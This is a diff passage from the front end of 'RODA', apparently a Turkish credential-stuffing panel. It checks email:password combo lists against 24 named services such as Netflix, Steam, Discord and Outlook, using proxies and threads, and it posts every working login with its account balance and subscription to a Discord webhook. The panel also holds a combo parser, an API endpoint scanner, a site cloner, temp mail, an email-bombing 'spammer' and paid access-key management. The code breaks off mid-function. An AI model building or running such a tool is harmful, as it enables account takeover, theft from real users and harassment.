+.scan-top input:focus{border-color:var(--p)}
+.scan-top button{padding:8px 20px;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;border:none;border-radius:10px;font-weight:700;cursor:pointer;display:flex;align-items:center;gap:6px;font-size:13px}
+.scan-top button:disabled{opacity:0.5;cursor:not-allowed}
+.filters{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:8px}
+.filters label{display:flex;align-items:center;gap:4px;font-size:11px;color:#94a3b8;cursor:pointer}
+.filters input[type=checkbox]{accent-color:var(--p);width:13px;height:13px}
+.results-container{flex:1;overflow-y:auto;border-radius:12px;background:rgba(0,0,0,0.25);border:1px solid var(--border)}
+.webhook-area{margin-top:10px;display:flex;gap:10px;flex-wrap:wrap;align-items:center}
+.webhook-area input{flex:1;min-width:150px;padding:6px 12px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:10px;color:#fff;font-size:12px;outline:none}
+.webhook-area input:focus{border-color:var(--p)}
+.webhook-area button{padding:6px 16px;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;border:none;border-radius:10px;font-weight:600;cursor:pointer;font-size:12px}
+.setting-row{display:flex;align-items:center;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border)}
+.setting-row label{font-size:13px;font-weight:500}
+.setting-row .desc{font-size:10px;color:var(--muted)}
+.switch{position:relative;width:40px;height:22px}
+.switch input{display:none}
+.slider{position:absolute;top:0;left:0;right:0;bottom:0;background:var(--border);border-radius:22px;cursor:pointer;transition:0.3s}
+.slider:before{content:"";position:absolute;height:16px;width:16px;left:3px;bottom:3px;background:#fff;border-radius:50%;transition:0.3s}
+input:checked+.slider{background:var(--g)}
+input:checked+.slider:before{transform:translateX(18px)}
+.proxy-area{display:flex;gap:10px;flex-wrap:wrap;margin-top:6px}
+.proxy-area textarea{flex:1;min-width:180px;height:50px;padding:6px 10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:11px;outline:none;resize:vertical;font-family:monospace}
+.proxy-area textarea:focus{border-color:var(--p)}
+.checker-platform-select{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px}
+.checker-platform-select button{padding:6px 14px;background:rgba(59,130,246,0.08);border:1px solid rgba(59,130,246,0.15);border-radius:8px;color:#94a3b8;font-size:12px;cursor:pointer;transition:0.2s;display:flex;align-items:center;gap:4px}
+.checker-platform-select button:hover{background:rgba(59,130,246,0.15);border-color:var(--p);color:#fff}
+.checker-platform-select button.active{background:rgba(59,130,246,0.2);border-color:var(--p);color:var(--p)}
+.checker-panel{display:none;background:var(--card);border:1px solid var(--border);border-radius:14px;padding:14px;margin-top:8px}
+.checker-panel.active{display:block}
+.checker-top{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-bottom:10px}
+.checker-top textarea{flex:1;min-width:200px;height:60px;padding:8px 12px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:12px;outline:none;resize:vertical;font-family:monospace}
+.checker-top textarea:focus{border-color:var(--p)}
+.checker-top input[type=number]{width:70px;padding:8px;text-align:center;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:13px;outline:none}
+.checker-top input[type=number]:focus{border-color:var(--p)}
+.checker-top button{padding:6px 18px;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;border:none;border-radius:8px;font-weight:600;cursor:pointer;font-size:13px}
+.checker-top button:disabled{opacity:0.5}
+.checker-top button#checkerStopBtn{background:var(--r);display:none}
+.checker-filters{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px}
+.checker-filters label{display:flex;align-items:center;gap:4px;font-size:11px;color:#94a3b8;cursor:pointer}
+.checker-filters input[type=radio]{accent-color:var(--p);width:13px;height:13px}
+.checker-results{max-height:250px;overflow-y:auto;border-radius:8px;background:rgba(0,0,0,0.2);border:1px solid var(--border)}
+.checker-result-row{display:grid;grid-template-columns:1fr 100px 60px;gap:8px;padding:6px 12px;border-bottom:1px solid rgba(255,255,255,0.03);font-size:12px;align-items:center}
+.checker-result-row .chk-status{font-weight:600}
+.chk-hit{color:var(--g)}.chk-bad{color:var(--r)}.chk-2fa{color:var(--gold)}.chk-error{color:#f59e0b}
+.checker-stats{display:flex;gap:16px;flex-wrap:wrap;margin:6px 0;font-size:12px}
+.checker-stats span{color:var(--muted)}
+.checker-stats .chk-count{font-weight:700;color:var(--text)}
+.hit-panel{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px}
+.hit-panel .hit-box{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:12px}
+.hit-panel .hit-box h4{font-size:13px;font-weight:700;margin-bottom:6px;display:flex;align-items:center;gap:6px}
+.hit-panel .hit-box h4 i{font-size:14px}
+.hit-panel .hit-box .hit-list{max-height:150px;overflow-y:auto;font-size:12px;color:var(--muted)}
+.hit-panel .hit-box .hit-list .hit-item{padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.03);display:flex;justify-content:space-between}
+.hit-panel .hit-box .hit-list .hit-item .hit-email{color:var(--text)}
+.hit-panel .hit-box .hit-list .hit-item .hit-time{font-size:10px;color:var(--muted)}
+.hit-filter{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:6px}
+.hit-filter select{padding:4px 10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:6px;color:#fff;font-size:12px;outline:none}
+.hit-filter select:focus{border-color:var(--p)}
+.parse-area{display:flex;flex-direction:column;gap:10px}
+.parse-area textarea{width:100%;height:180px;padding:10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:12px;font-family:monospace;resize:vertical;outline:none}
+.parse-area textarea:focus{border-color:var(--p)}
+.parse-buttons{display:flex;gap:10px;flex-wrap:wrap}
+.parse-result{max-height:200px;overflow-y:auto;background:rgba(0,0,0,0.2);border:1px solid var(--border);border-radius:8px;padding:8px}
+.parse-result .parse-line{padding:2px 6px;font-size:12px;font-family:monospace;color:#c8d0dc}
+.parse-result .parse-count{color:var(--g);font-weight:600;font-size:13px}
+.discovery-platforms{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:8px}
+.discovery-platforms button{padding:4px 12px;background:rgba(59,130,246,0.06);border:1px solid rgba(59,130,246,0.1);border-radius:6px;color:#94a3b8;font-size:11px;cursor:pointer;transition:0.2s}
+.discovery-platforms button:hover{background:rgba(59,130,246,0.12);border-color:var(--p);color:#fff}
+.discovery-platforms button.active{background:rgba(59,130,246,0.15);border-color:var(--p);color:var(--p)}
+::-webkit-scrollbar{width:4px}::-webkit-scrollbar-thumb{background:rgba(59,130,246,0.2);border-radius:4px}
+</style>
+</head>
+<body>
+<div class="snowflakes" id="snowContainer"></div>
+<div id="login-screen">
+<div id="login-box">
+<div class="logo"><i class="fa-solid fa-crown"></i></div>
+<h1>RODA</h1>
+<p class="sub">API Discovery + Checker</p>
+<input class="inp" type="password" id="authKey" placeholder="Güvenlik Anahtarı" autofocus>
+<button class="btn" onclick="doLogin()" style="margin-top:12px">Giriş Yap</button>
+<p id="loginError" style="color:var(--r);margin-top:12px;display:none"></p>
+</div>
+</div>
+<div id="sidebar">
+<div class="sidebar-header"><div class="logo-text">RODA</div><div class="version">v3.0</div></div>
+<div class="sidebar-nav">
+<div class="nav-divider">📁 MENÜ</div>
+<div class="nav-item active" data-page="checker" onclick="switchPage('checker')"><i class="fa-solid fa-check-double"></i> Checker</div>
+<div class="nav-item" data-page="proxy" onclick="switchPage('proxy')"><i class="fa-solid fa-server"></i> Proxy</div>
+<div class="nav-item" data-page="parse" onclick="switchPage('parse')"><i class="fa-solid fa-scissors"></i> Ayrıştırma</div>
+<div class="nav-divider-admin">🔒 ADMIN</div>
+<div class="nav-item" data-page="logs" onclick="switchPage('logs')" id="logsMenuItem" style="display:none"><i class="fa-solid fa-history"></i> Loglar</div>
+<div class="nav-item" data-page="discovery" onclick="switchPage('discovery')" id="discoveryMenuItem" style="display:none"><i class="fa-solid fa-compass"></i> API Keşif</div>
+<div class="nav-item" data-page="stats" onclick="switchPage('stats')" id="statsMenuItem" style="display:none"><i class="fa-solid fa-chart-simple"></i> İstatistik</div>
+<div class="nav-item" data-page="keys" onclick="switchPage('keys')" id="keysMenuItem" style="display:none"><i class="fa-solid fa-key"></i> Key Yönetimi</div>
+<div class="nav-item" data-page="sitecopy" onclick="switchPage('sitecopy')" id="sitecopyMenuItem" style="display:none"><i class="fa-solid fa-copy"></i> Site Kopyala</div>
+<div class="nav-item" data-page="tempmail" onclick="switchPage('tempmail')" id="tempmailMenuItem" style="display:none"><i class="fa-solid fa-envelope"></i> Temp Mail</div>
+<div class="nav-item" data-page="spammer" onclick="switchPage('spammer')" id="spammerMenuItem" style="display:none"><i class="fa-solid fa-bomb"></i> Email Spammer</div>
+</div>
+<div class="sidebar-stats">
+<div class="mini-stat mini-hit"><div class="val" id="sideTotal">0</div><div class="lbl">Bulunan</div></div>
+<div class="mini-stat mini-2fa"><div class="val" id="sideAuth">0</div><div class="lbl">Auth</div></div>
+<div class="mini-stat mini-bad"><div class="val" id="sideAPI">0</div><div class="lbl">API</div></div>
+<div class="mini-stat mini-check"><div class="val" id="sideAdmin">0</div><div class="lbl">Admin</div></div>
+</div>
+<div class="sidebar-footer">© 2026 Roda</div>
+</div>
+<div id="app">
+<div class="topbar">
+<div class="topbar-title"><i class="fa-solid fa-gauge-high"></i> <span id="pageTitle">Checker</span></div>
+<div class="topbar-right">
+<span style="font-size:11px;color:var(--muted)">Durum:</span>
+<div class="pulse-dot idle" id="statusDot"></div>
+<span style="font-size:12px;font-weight:600" id="statusText">Boşta</span>
+<span id="userBadge" style="font-size:11px;background:var(--p);padding:2px 10px;border-radius:12px;display:none">Admin</span>
+</div>
+</div>
+<div class="main-content">
+<div id="page-checker" class="page active">
+<div class="card">
+<h3><i class="fa-solid fa-check-double"></i> Platform Checker</h3>
+<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Bir platform seçin, combo girişi yapın ve kontrol başlatın. <span style="color:var(--gold)">✅ HIT'ler otomatik webhook ile gönderilir!</span></p>
+<div class="checker-platform-select" id="checkerPlatformSelect"></div>
+<div class="checker-panel" id="checkerPanel">
+<div class="checker-top">
+<textarea id="checkerCombo" placeholder="email:password (her satıra bir combo)"></textarea>
+<input type="number" id="checkerThreads" value="1" min="1" max="50">
+<button id="checkerStartBtn" onclick="startChecker()"><i class="fa-solid fa-play"></i> Başlat</button>
+<button id="checkerStopBtn" onclick="stopChecker()"><i class="fa-solid fa-stop"></i> Durdur</button>
+</div>
+<div class="checker-stats">
+<span>Toplam: <span class="chk-count" id="chkTotal">0</span></span>
+<span>Başarılı: <span class="chk-count" id="chkHit">0</span></span>
+<span>Başarısız: <span class="chk-count" id="chkBad">0</span></span>
+<span>2FA: <span class="chk-count" id="chk2fa">0</span></span>
+<span>Hata: <span class="chk-count" id="chkError">0</span></span>
+<span>Kalan: <span class="chk-count" id="chkRemaining">0</span></span>
+</div>
+<div class="checker-filters">
+<label><input type="radio" name="chkFilter" value="all" checked> Hepsi</label>
+<label><input type="radio" name="chkFilter" value="hit"> Başarılı</label>
+<label><input type="radio" name="chkFilter" value="bad"> Başarısız</label>
+<label><input type="radio" name="chkFilter" value="2fa"> 2FA</label>
+<label><input type="radio" name="chkFilter" value="error"> Hata</label>
+</div>
+<div class="checker-results" id="checkerResults">
+<div style="padding:20px;text-align:center;color:var(--muted);font-size:13px">Henüz sonuç yok.</div>
+</div>
+</div>
+</div>
+<div class="card">
+<h3><i class="fa-solid fa-database"></i> HIT & 2FA Arşivi</h3>
+<button class="btn sm r" onclick="clearHits()" style="width:auto;margin-bottom:6px"><i class="fa-solid fa-trash"></i> Tümünü Temizle</button>
+<div class="hit-filter">
+<select id="hitPlatformFilter" onchange="renderHits()">
+<option value="all">Tüm Platformlar</option>
+</select>
+</div>
+<div class="hit-panel">
+<div class="hit-box">
+<h4 style="color:var(--g)"><i class="fa-solid fa-check-circle"></i> HIT</h4>
+<div class="hit-list" id="hitList"><div style="color:var(--muted);font-size:12px">Henüz HIT yok.</div></div>
+</div>
+<div class="hit-box">
+<h4 style="color:var(--gold)"><i class="fa-solid fa-shield-halved"></i> 2FA</h4>
+<div class="hit-list" id="twofaList"><div style="color:var(--muted);font-size:12px">Henüz 2FA yok.</div></div>
+</div>
+</div>
+</div>
+</div>
+<div id="page-proxy" class="page">
+<div class="card">
+<h3><i class="fa-solid fa-server"></i> Proxy Yöneticisi</h3>
+<div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px">
+<button class="btn sm g" onclick="fetchProxies()"><i class="fa-solid fa-cloud-arrow-down"></i> Proxy Çek</button>
+<button class="btn sm r" onclick="clearProxies()"><i class="fa-solid fa-trash"></i> Temizle</button>
+</div>
+<div class="setting-row">
+<div><label>Proxy Kullan</label><div class="desc">Checker sırasında proxy kullan</div></div>
+<label class="switch"><input type="checkbox" id="useProxy" onchange="toggleProxy()"><span class="slider"></span></label>
+</div>
+<div class="proxy-area">
+<textarea id="proxyList" placeholder="ip:port&#10;ip:port"></textarea>
+</div>
+<div style="margin-top:6px"><span id="proxyCount" style="color:var(--g);font-size:12px">0 proxy yüklendi</span></div>
+</div>
+</div>
+<div id="page-discovery" class="page">
+<div class="card" style="padding:10px 14px">
+<div class="scan-top">
+<input id="targetDomain" placeholder="hedef.com (örn: youtube.com)" value="example.com">
+<button id="scanBtn" onclick="startScan()"><i class="fa-solid fa-play"></i> Tara</button>
+</div>
+<div class="discovery-platforms" id="discoveryPlatforms"></div>
+</div>
+<div class="stats-row">
+<div class="stat-card stat-hit"><div class="stat-val" id="totalCount">0</div><div class="stat-lbl">Toplam</div></div>
+<div class="stat-card stat-2fa"><div class="stat-val" id="authCount">0</div><div class="stat-lbl">Auth</div></div>
+<div class="stat-card stat-bad"><div class="stat-val" id="apiCount">0</div><div class="stat-lbl">API</div></div>
+<div class="stat-card stat-total"><div class="stat-val" id="adminCount">0</div><div class="stat-lbl">Admin</div></div>
+</div>
+<div class="filters" id="filterContainer">
+<label><input type="checkbox" value="Auth" checked> Auth</label>
+<label><input type="checkbox" value="Admin" checked> Admin</label>
+<label><input type="checkbox" value="User" checked> User</label>
+<label><input type="checkbox" value="Health" checked> Health</label>
+<label><input type="checkbox" value="API" checked> API</label>
+<label><input type="checkbox" value="Genel" checked> Genel</label>
+</div>
+<div class="results-container">
+<div class="result-header"><div>Metod</div><div>Durum</div><div>Endpoint</div><div>Kategori</div></div>
+<div id="resultsList"></div>
+</div>
+<div class="webhook-area">
+<input id="webhookUrl" placeholder="Discord Webhook URL">
+<button onclick="saveWebhook()"><i class="fa-solid fa-floppy-disk"></i> Webhook Kaydet</button>
+<button onclick="testWebhook()"><i class="fa-solid fa-paper-plane"></i> Test</button>
+<button onclick="sendWebhook()"><i class="fa-brands fa-discord"></i> Discord</button>
+<button onclick="exportJSON()" class="btn sm b"><i class="fa-solid fa-download"></i> JSON</button>
+<p id="webhookStatus" style="margin-top:6px;font-size:12px;color:var(--muted)"></p>
+</div>
+</div>
+<div id="page-parse" class="page">
+<div class="card">
+<h3><i class="fa-solid fa-scissors"></i> Ayrıştırma</h3>
+<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Karmaşık metinleri temizler, 2 mod seçeneği ile ayrıştırır.</p>
+<div class="parse-area">
+<label style="font-size:13px;color:var(--muted)">Mod Seç:</label>
+<select id="parseMode" style="padding:8px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:12px;outline:none;width:200px">
+<option value="email">Email:Şifre</option>
+<option value="user">Kullanıcı:Şifre</option>
+</select>
+<textarea id="parseInput" placeholder="Buraya karışık metni yapıştır..."></textarea>
+<div class="parse-buttons">
+<button class="btn sm g" onclick="parseData()"><i class="fa-solid fa-wand-magic-sparkles"></i> Ayrıştır</button>
+<button class="btn sm b" onclick="parseToChecker()"><i class="fa-solid fa-arrow-right"></i> Checker'a Aktar</button>
+<button class="btn sm r" onclick="clearParse()"><i class="fa-solid fa-eraser"></i> Temizle</button>
+<button class="btn sm" style="background:#64748b" onclick="loadParseFile()"><i class="fa-solid fa-folder-open"></i> Dosya Yükle</button>
+</div>
+<div class="parse-result" id="parseResult">
+<div style="color:var(--muted);font-size:13px;padding:10px">Henüz ayrıştırma yapılmadı.</div>
+</div>
+<div style="margin-top:6px;font-size:12px;color:var(--muted)">
+<span id="parseCount">0 satır</span> | <span id="parseValid">0 geçerli</span>
+</div>
+</div>
+</div>
+</div>
+<div id="page-stats" class="page">
+<h2 style="margin-bottom:14px;font-weight:700;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent">📊 Tarama İstatistikleri</h2>
+<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:14px">
+<div style="background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px"><h3 style="font-size:12px;color:var(--muted)">Toplam Tarama</h3><p style="font-size:22px;font-weight:800;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent" id="statScans">0</p></div>
+<div style="background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px"><h3 style="font-size:12px;color:var(--muted)">Son Tarama</h3><p style="font-size:22px;font-weight:800;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent" id="statLast">-</p></div>
+<div style="background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px"><h3 style="font-size:12px;color:var(--muted)">Bulunan API</h3><p style="font-size:22px;font-weight:800;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent" id="statEndpoints">0</p></div>
+</div>
+</div>
+<div id="page-keys" class="page">
+<div class="card">
+<h3><i class="fa-solid fa-key"></i> Key Oluştur</h3>
+<p style="font-size:11px;color:var(--muted);margin-bottom:8px">🔒 Her key sadece 1 IP'ye bağlanır ve 1 kez kullanılır.</p>
+<div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:6px">
+<div style="flex:1"><label style="font-size:11px;color:var(--muted)">Not</label><input class="inp" id="genNote" placeholder="Müşteri" style="margin-top:4px;padding:10px"></div>
+<div style="width:130px"><label style="font-size:11px;color:var(--muted)">Süre</label><select class="inp" id="genHours" style="margin-top:4px;padding:10px"><option value="1">1 Saat</option><option value="24" selected>24 Saat</option><option value="168">7 Gün</option><option value="720">30 Gün</option></select></div>
+<button class="btn sm g" onclick="generateKey()" style="margin-top:22px"><i class="fa-solid fa-plus"></i> Oluştur</button>
+</div>
+</div>
+<div class="card"><h3><i class="fa-solid fa-list"></i> Aktif Anahtarlar</h3><div id="keyList"><p style="color:var(--muted);font-size:12px">Yükleniyor...</p></div></div>
+</div>
+<div id="page-logs" class="page">
+<div class="card">
+<h3><i class="fa-solid fa-history"></i> Sistem Logları</h3>
+<button class="btn sm" onclick="refreshLogs()" style="width:auto;margin-bottom:10px"><i class="fa-solid fa-rotate"></i> Yenile</button>
+<div id="logsContainer" style="max-height:400px;overflow-y:auto;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-family:monospace;font-size:12px;"></div>
+</div>
+</div>
+<div id="page-sitecopy" class="page">
+<div class="card">
+<h3><i class="fa-solid fa-copy"></i> Site Kopyala</h3>
+<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Bir web sitesinin tam HTML'ini kopyalar.</p>
+<div class="scan-top" style="margin-bottom:12px">
+<input id="siteCopyUrl" placeholder="https://ornek.com veya ornek.com" value="https://www.tabii.com">
+<button onclick="copySite()"><i class="fa-solid fa-download"></i> Kopyala & İndir</button>
+</div>
+<div id="siteCopyResult" style="font-size:13px;color:var(--muted);"></div>
+</div>
+</div>
+<div id="page-tempmail" class="page">
+<div class="card">
+<h3><i class="fa-solid fa-envelope"></i> Geçici E-Posta</h3>
+<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Mail.tm ile geçici e-posta oluşturur.</p>
+<div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:12px">
+<input class="inp" id="tempMailInput" placeholder="E-posta adresi" readonly style="flex:1;padding:10px">
+<button class="btn sm g" onclick="generateTempMail()"><i class="fa-solid fa-plus"></i> Adres Üret</button>
+<button class="btn sm b" onclick="copyTempMail()"><i class="fa-solid fa-copy"></i> Kopyala</button>
+</div>
+<button class="btn sm" onclick="refreshTempMail()" style="width:auto;margin-bottom:10px"><i class="fa-solid fa-rotate"></i> Gelen Kutusunu Yenile</button>
+<div id="tempMailInbox" style="max-height:300px;overflow-y:auto;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-size:13px;"></div>
+<div id="tempMailContent" style="margin-top:10px;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-size:13px;"></div>
+</div>
+</div>
+<div id="page-spammer" class="page">
+<div class="card">
+<h3><i class="fa-solid fa-bomb"></i> Email Spammer</h3>
+<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Hedef e-postaya sürekli paket gönderir.</p>
+<div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:12px">
+<input class="inp" id="spamEmailInput" placeholder="Hedef e-posta" style="flex:1;padding:10px">
+<button class="btn sm r" onclick="startSpam()"><i class="fa-solid fa-play"></i> Başlat</button>
+<button class="btn sm" onclick="stopSpam()" id="spamStopBtn" style="display:none;background:#64748b"><i class="fa-solid fa-stop"></i> Durdur</button>
+</div>
+<div id="spamLog" style="max-height:300px;overflow-y:auto;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-family:monospace;font-size:12px;"></div>
+</div>
+</div>
+</div>
+</div>
+<script>
+(function createSnow() {
+    var container = document.getElementById('snowContainer');
+    var flakes = ['❄','❅','❆','✦'];
+    for (var i = 0; i < 50; i++) {
+        var flake = document.createElement('div');
+        flake.className = 'snowflake';
+        flake.textContent = flakes[Math.floor(Math.random() * flakes.length)];
+        flake.style.left = Math.random() * 100 + '%';
+        flake.style.fontSize = (0.8 + Math.random() * 1.5) + 'em';
+        flake.style.animationDuration = (6 + Math.random() * 8) + 's';
+        flake.style.animationDelay = Math.random() * 5 + 's';
+        container.appendChild(flake);
+    }
+})();
+var currentKey = "";
+var isAdmin = false;
+var scanning = false;
+var eventSource = null;
+var foundEndpoints = [];
+var useProxy = false;
+var checkerRunning = false;
+var checkerResults = [];
+var currentPlatform = "";
+var hitData = {};
+var parsedLines = [];
+var totalLines = 0;
+var processedCount = 0;
+var spamRunning = false;
+var spamInterval = null;
+var tempMailToken = "";
+
+var platforms = [
+    {name:"YouTube", domain:"youtube.com", icon:"fa-brands fa-youtube"},
+    {name:"TikTok Gen", domain:"tiktok.com", icon:"fa-brands fa-tiktok"},
+    {name:"Spotify", domain:"spotify.com", icon:"fa-brands fa-spotify"},
+    {name:"Roblox", domain:"roblox.com", icon:"fa-solid fa-gamepad"},
+    {name:"Netflix", domain:"netflix.com", icon:"fa-solid fa-film"},
+    {name:"CapCut", domain:"capcut.com", icon:"fa-solid fa-scissors"},
+    {name:"Discord", domain:"discord.com", icon:"fa-brands fa-discord"},
+    {name:"Epic Games", domain:"epicgames.com", icon:"fa-solid fa-crown"},
+    {name:"Hesapcomtr", domain:"hesap.com.tr", icon:"fa-solid fa-user"},
+    {name:"Itemsatış", domain:"itemsatis.com", icon:"fa-solid fa-cart-shopping"},
+    {name:"Epinify", domain:"epinify.com", icon:"fa-solid fa-ticket"},
+    {name:"Twitch", domain:"twitch.tv", icon:"fa-brands fa-twitch"},
+    {name:"Steam", domain:"steampowered.com", icon:"fa-brands fa-steam"},
+    {name:"PlayStation", domain:"playstation.com", icon:"fa-solid fa-play"},
+    {name:"Xbox & MC", domain:"xbox.com", icon:"fa-brands fa-xbox"},
+    {name:"GitHub", domain:"github.com", icon:"fa-brands fa-github"},
+    {name:"Minecraft", domain:"minecraft.net", icon:"fa-solid fa-cube"},
+    {name:"Wolfteam", domain:"joygame.com", icon:"fa-solid fa-skull"},
+    {name:"Craftrise", domain:"craftrise.com.tr", icon:"fa-solid fa-hammer"},
+    {name:"Hotmail", domain:"outlook.com", icon:"fa-solid fa-envelope"},
+    {name:"Token Check", domain:"discord.com", icon:"fa-solid fa-key"},
+    {name:"Tabii", domain:"tabii.com", icon:"fa-solid fa-tv"},
+    {name:"Supercell", domain:"supercell.com", icon:"fa-solid fa-gamepad"},
+    {name:"Roda Inbox", domain:"outlook.com", icon:"fa-solid fa-inbox"}
+];
+
+function saveWebhook() {
+    var url = document.getElementById("webhookUrl").value.trim();
+    if (url) {
+        localStorage.setItem("roda_webhook_url", url);
+        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook kaydedildi!</span>';
+    } else {
+        localStorage.removeItem("roda_webhook_url");
+        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--muted)">Webhook temizlendi.</span>';
+    }
+}
+function getWebhookUrl() {
+    return localStorage.getItem("roda_webhook_url") || "";
+}
+function loadWebhookUrl() {
+    var url = getWebhookUrl();
+    if (url) {
+        document.getElementById("webhookUrl").value = url;
+        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook yüklendi</span>';
+    }
+}
+function sendCheckerWebhook(platform, email, password, details) {
+    var url = getWebhookUrl();
+    if (!url) return;
+    var content = "✅ **" + platform + " HIT!**\n" + email + " | " + password;
+    if (details) {
+        if (details.full_name) content += "\n👤 " + details.full_name;
+        if (details.subscription) content += "\n📦 " + details.subscription;
+        if (details.expire) content += "\n📅 " + details.expire;
+        if (details.profiles_count !== undefined) content += "\n👥 " + details.profiles_count + " profil";
+        if (details.gamertag) content += "\n🎮 " + details.gamertag;
+        if (details.level) content += "\n📊 Level: " + details.level;
+        if (details.balance) content += "\n💰 Bakiye: " + details.balance;
+        if (details.vac) content += "\n🔴 " + details.vac;
+        if (details.games) {
+            var gameStr = Object.keys(details.games).filter(k => details.games[k] === "✔️").join(", ");
+            if (gameStr) content += "\n🎮 Supercell: " + gameStr;
+        }
+        if (details.total_found !== undefined) content += "\n📬 Mail: " + details.total_found;
+        if (details.services_found) content += "\n📨 Servis: " + details.services_found.join(", ");
+    }
+    fetch(url, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({content: content})}).catch(function(e){});
+}
+function testWebhook() {
+    var url = document.getElementById("webhookUrl").value.trim();
+    if (!url) return alert("Webhook URL girin!");
+    fetch(url, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({content: "🧪 **Roda Test** Webhook çalışıyor!"})})
+    .then(function(r){ document.getElementById("webhookStatus").innerHTML = r.ok ? '<span style="color:var(--g)">✅ Test başarılı!</span>' : '<span style="color:var(--r)">❌ Test başarısız!</span>'; })
+    .catch(function(e){ document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--r)">❌ Hata: ' + e.message + '</span>'; });
+}
+
+function doLogin() {
+    var k = document.getElementById("authKey").value.trim();
+    if (!k) { alert("Anahtar girin!"); return; }
+    fetch("/api/login", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({key: k})})
+    .then(function(r){ return r.json(); })
+    .then(function(d){
+        if (d.success) {
+            currentKey = k;
+            isAdmin = d.isAdmin || false;
+            document.getElementById("login-screen").style.display = "none";
+            document.getElementById("app").style.display = "flex";
+            if (isAdmin) {
+                document.getElementById("userBadge").style.display = "inline-block";
+                ["logsMenuItem","discoveryMenuItem","statsMenuItem","keysMenuItem","sitecopyMenuItem","tempmailMenuItem","spammerMenuItem"].forEach(function(id){
+                    document.getElementById(id).style.display = "flex";
+                });
+                loadKeys();
+            } else {
+                document.getElementById("userBadge").style.display = "none";
+                ["logsMenuItem","discoveryMenuItem","statsMenuItem","keysMenuItem","sitecopyMenuItem","tempmailMenuItem","spammerMenuItem"].forEach(function(id){
+                    document.getElementById(id).style.display = "none";
+                });
+            }
+            loadPlatforms();
+            loadDiscoveryPlatforms();
+            loadHitFilter();
+            loadWebhookUrl();
+            switchPage('checker');
+        } else {
+            document.getElementById("loginError").innerText = "❌ Geçersiz anahtar!";
+            document.getElementById("loginError").style.display = "block";
+        }
+    })
+    .catch(function(e){ alert("Sunucuya bağlanılamadı! Flask çalışıyor mu?"); console.error(e); });
+}
+document.getElementById("authKey").addEventListener("keypress", function(e){ if(e.key === "Enter") doLogin(); });
+
+function loadPlatforms() {
+    var sel = document.getElementById("checkerPlatformSelect");
+    sel.innerHTML = "";
+    platforms.forEach(function(p){
+        var btn = document.createElement("button");
+        btn.innerHTML = '<i class="' + p.icon + '"></i> ' + p.name;
+        btn.onclick = function(){
+            document.querySelectorAll("#checkerPlatformSelect button").forEach(function(b){ b.classList.remove("active"); });
+            btn.classList.add("active");
+            currentPlatform = p.name;
+            document.getElementById("checkerPanel").classList.add("active");
+            document.getElementById("checkerResults").innerHTML = '<div style="padding:20px;text-align:center;color:var(--muted);font-size:13px">' + p.name + ' checker hazır.</div>';
+            resetCheckerStats();
+            checkerResults = [];
+        };
+        sel.appendChild(btn);
+    });
+    if (platforms.length > 0) { var first = sel.querySelector("button"); if (first) first.click(); }
+}
+
+function loadDiscoveryPlatforms() {
+    var container = document.getElementById("discoveryPlatforms");
+    container.innerHTML = "";
+    platforms.forEach(function(p){
+        var btn = document.createElement("button");
+        btn.innerHTML = '<i class="' + p.icon + '"></i> ' + p.name;
+        btn.onclick = function(){
+            document.querySelectorAll("#discoveryPlatforms button").forEach(function(b){ b.classList.remove("active"); });
+            btn.classList.add("active");
+            document.getElementById("targetDomain").value = p.domain;
+        };
+        container.appendChild(btn);
+    });
+}
+
+function loadHitFilter() {
+    var sel = document.getElementById("hitPlatformFilter");
+    sel.innerHTML = '<option value="all">Tüm Platformlar</option>';
